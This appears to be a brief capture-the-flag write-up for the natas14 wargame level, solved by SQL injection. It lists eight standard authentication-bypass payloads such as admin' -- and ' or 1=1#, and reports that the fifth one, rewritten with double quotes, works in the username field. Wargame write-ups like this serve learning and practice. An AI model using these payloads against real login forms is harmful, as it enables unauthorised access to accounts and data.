# natas14

Now this is an SQLi problem. We try the regular expressions with password first. We try the below list in general-
```markdown
1. admin' --
2. admin' #
3. admin'/*
4. ' or 1=1--
5. ' or 1=1#
6. ' or 1=1/*  
7. ') or '1'='1--
8. ') or ('1'='1--
```
Now use it on both password and username, but with double quotes(`"`)since source code uses `"`. And it turns out the correct ans is `username= point 5` and `password=anything`.
